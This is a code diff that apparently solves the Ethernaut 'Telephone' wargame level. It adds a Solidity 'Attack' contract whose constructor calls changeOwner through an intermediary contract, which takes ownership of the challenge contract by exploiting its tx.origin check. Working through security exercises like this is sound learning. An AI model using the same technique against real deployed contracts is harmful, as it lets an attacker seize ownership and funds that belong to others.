@@ -5,6 +5,16 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract Attack {
+    address internal owner = 0xd4c384eC8a9f9EbFc97458833FF0147a131f7057;
+    constructor(address addr) {
+        ITelephone(addr).changeOwner(owner);
+    }
+}
 
 contract TelephoneSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;
@@ -15,10 +25,8 @@ contract TelephoneSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
-
-
+        Attack attack = new Attack(address(challengeInstance));
+        
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
         require(levelSuccess, "Challenge not passed yet");
